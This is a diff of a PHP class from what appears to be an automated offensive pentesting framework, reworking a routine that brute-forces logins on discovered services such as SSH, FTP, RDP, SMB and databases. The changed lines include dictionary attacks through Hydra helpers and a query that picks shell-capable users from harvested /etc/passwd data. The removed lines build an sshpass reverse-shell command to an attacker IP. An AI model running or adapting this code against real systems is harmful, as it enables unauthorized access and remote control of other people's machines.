@@ -1685,54 +1685,52 @@ as the header options; the TTL changes.");
 	public function ip2auth(){
 	    $this->titre(__FUNCTION__);
 	$sql_service = "select id8port,service2name FROM SERVICE WHERE id8port IN (SELECT id FROM PORT WHERE id8ip= '$this->ip2id') AND (service2name = 'asterisk' OR service2name LIKE '%ftp%'  OR service2name = 'icq' OR service2name = 'imap' OR service2name = 'imaps' OR service2name = 'ldap2' OR service2name = 'ldap2s' OR service2name = 'ldap3' OR service2name = 'mssql' OR service2name = 'mysql' OR service2name = 'nntp' OR service2name = 'oracle-listener' OR service2name = 'oracle-sid' OR service2name = 'pcanywhere' OR service2name = 'postgres' OR service2name = 'rlogin'  OR service2name LIKE '%rdp%' OR service2name = 'sip' OR service2name = 'ssh' OR service2name LIKE '%smb%' OR service2name LIKE '%samba%' OR service2name = 'snmp' OR service2name = 'smtp' OR service2name = 'smtps' OR service2name = 'vnc' OR service2name = 'xmpp')  ;";
-	$this->req_ret_str("mysql --user=$this->mysql_login --password=$this->mysql_passwd --database=$this->mysql_database --execute=\"$sql_service\"  2>/dev/null ");
+	$this->parchment($this->req_ret_str("mysql --user=$this->mysql_login --password=$this->mysql_passwd --database=$this->mysql_database --execute=\"$sql_service\"  2>/dev/null "));
 		    if ( $service = $this->mysql_ressource->query($sql_service) ) {
+		        
+		        
 		        $users = $this->ip2users4passwd();
 		        if (!empty($users))
-		        foreach ($users as $user2name => $user2pass){
-		            if (!empty($user2name)) {
 		            while ($service_row = $service->fetch_assoc()) {
-		                $this->titre("Attack Authentication By Dictionnary ");
+		                foreach ($users as $user2name => $user2pass){
+		                    if (!empty($user2name)) {
+		                $service2name = $service_row['service2name'];
+		                $this->titre("Try Authentication By Username-Password ");
 		                $query = "select port FROM PORT WHERE id = '".$service_row['id8port']."' ;";
 		                $port = trim($this->req_ret_str("mysql --user=$this->mysql_login --password=$this->mysql_passwd --database=$this->mysql_database --execute=\"$query\"  2>/dev/null | grep -v port "));
 		                $query = "select protocol FROM PORT WHERE id = '".$service_row['id8port']."' ;";
 		                $protocol = trim($this->req_ret_str("mysql --user=$this->mysql_login --password=$this->mysql_passwd --database=$this->mysql_database --execute=\"$query\"  2>/dev/null | grep -v protocol "));
-		                
 		                $obj_port = new AUTH($this->eth,$this->domain,$this->ip, $port,$protocol);
-		                if ($service_row['service2name']==="ssh"){
+		                
+		                if ($service2name==="ssh"){
 		                    $test = new SERVICE($obj_port->eth,$obj_port->domain,$obj_port->ip, $obj_port->port,$obj_port->protocol);
 		                    $test->poc($this->flag_poc);
-		                    $stream = $test->stream8ssh8passwd($test->ip, $test->port, $user2name,$user2pass);
-		                     if(is_resource($stream)){
-		                        $info = "SSH user/pass $user2name/$user2pass";
-		                        $this->log2succes($info);
-		                        $template_shell = "sshpass -p '$user2pass' ssh -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null  $remote_username_ftp@$this->ip -p $ssh_open -C  \"%SHELL%\" ";
-		                        $templateB64_shell = base64_encode($template_shell);
-		                        $attacker_ip = $this->ip4addr4target($this->ip);
-		                        $attacker_port = rand(1024,65535);
-		                        $shell = "/bin/bash";
-		                        $cmd_rev  = $this->rev8sh($attacker_ip, $attacker_port, $shell);
-		                        $cmd = str_replace("%SHELL%", $cmd_rev, $template_shell);
-		                        
-		                        $lprotocol = 'T' ;
-		                        $type = "server";
-		                        $this->service4lan($cmd, $templateB64_shell, $attacker_port, $lprotocol, $type);
-		                    }
+		                    $test->stream8ssh8passwd($test->ip, $test->port, $user2name,$user2pass);
+
 		                }
 		                
-		                else $obj_port->port2auth4pass4hydra($service_row['service2name'], $user2name,$user2pass);
+		                else $obj_port->port2auth4pass4hydra($service2name, $user2name,$user2pass);
 		                
-		                
-		                //
+		         
 		                		            }
 		            }
 		    }
 		        $users = $this->ip2users4shell();
+		        var_dump($users);
 		        if (!empty($users))
-		            foreach ($users as $user2name){
-		                if (!empty($user2name)) {
-		                    $obj_port->port2auth4dico4hydra($service_row['service2name'],$user2name);
+		                    while ($service_row = $service->fetch_assoc()) {
+		                        $service2name = $service_row['service2name'];
+		                        foreach ($users as $user2name ){
+		                            if (!empty($user2name)) {
+		                        $this->titre("Try Authentication By Dictionnary ");
+		                        $query = "select port FROM PORT WHERE id = '".$service_row['id8port']."' ;";
+		                        $port = trim($this->req_ret_str("mysql --user=$this->mysql_login --password=$this->mysql_passwd --database=$this->mysql_database --execute=\"$query\"  2>/dev/null | grep -v port "));
+		                        $query = "select protocol FROM PORT WHERE id = '".$service_row['id8port']."' ;";
+		                        $protocol = trim($this->req_ret_str("mysql --user=$this->mysql_login --password=$this->mysql_passwd --database=$this->mysql_database --execute=\"$query\"  2>/dev/null | grep -v protocol "));
+		                        $obj_port = new AUTH($this->eth,$this->domain,$this->ip, $port,$protocol);
+		                        $obj_port->port2auth4dico4hydra($service2name,$user2name);
 		                }
+		        }
 		        }
 	    }
 	    
@@ -2012,7 +2010,7 @@ public function ip2vhost(){
 	     }
 	     
 	    $tab_users = $this->ip2users();
-	    $this->article("All Users Found", $this->parchment($this->tab($tab_users)));
+	    $this->parchment($this->tab($tab_users));
 	 }
 	
 	
@@ -2072,7 +2070,9 @@ public function ip2vhost(){
 	    
 	    if  (!$this->ip4service8db($this->ip2id) ) {
 	        $this->ip4service2display();
-	        $this->ip4enum2users();
+	        //$this->ip4enum2users();
+	        //$this->ip2os();$this->pause();	        
+	        $this->ip2auth();$this->pause();
 	        $sql_ip = "UPDATE IP SET ip4service=1 WHERE id = $this->ip2id  ";
 	        $this->mysql_ressource->query($sql_ip);
 	    }
@@ -2102,9 +2102,8 @@ public function ip2vhost(){
 	    $this->gtitre(__FUNCTION__);
 	    $this->ip4info();$this->pause();
 	    $this->ip4service();$this->pause();
-	    $this->ip2os();$this->pause();
-	    //$this->ip2cve();$this->pause();
-		$this->ip2auth();$this->pause();
+
+		//$this->ip2cve();$this->pause();
 		//$result .=  $this->ip2vuln();$this->pause();
 	    
 	    if(!$this->ip2honey()){
@@ -2116,7 +2115,7 @@ public function ip2vhost(){
 	                        if (!empty($port_num)) {
 	                            $obj_service = new SERVICE($this->eth,$this->domain,$this->ip,$port_num, $protocol);
 	                            $obj_service->poc($this->flag_poc);
-	                            $obj_service->port4pentest();
+	                            //$obj_service->port4pentest();
 	                        }
 	                }
 	            }
@@ -2139,7 +2138,7 @@ public function ip2vhost(){
 	public function ip2users4shell():array{
 	    $this->ssTitre(__FUNCTION__);
 	    $tab_ip2users4shell = array("root");
-	    $sql_r_2 = "SELECT distinct(user2name) FROM USERS WHERE id8port IN (select id from PORT where id8ip = '$this->ip2id' ) AND ( user2name != '' AND user2methode = 'cat /etc/passwd' AND ( from_base64(user2infos) LIKE \"%/bin/sh%\" OR from_base64(user2infos) LIKE \"%/bin/bash%\") ) ORDER by user2name ASC ";
+	    $sql_r_2 = "SELECT distinct(user2name) FROM USERS WHERE id8port IN (select id from PORT where id8ip = '$this->ip2id' ) AND ( user2name != '' AND ( from_base64(user2infos) LIKE \"%/bin/sh%\" OR from_base64(user2infos) LIKE \"%/bin/bash%\") ) ORDER by user2name ASC ";
 	    //echo "$sql_r_2\n";
 	    $conn = $this->mysql_ressource->query($sql_r_2);
 	    while($row = $conn->fetch_assoc()){
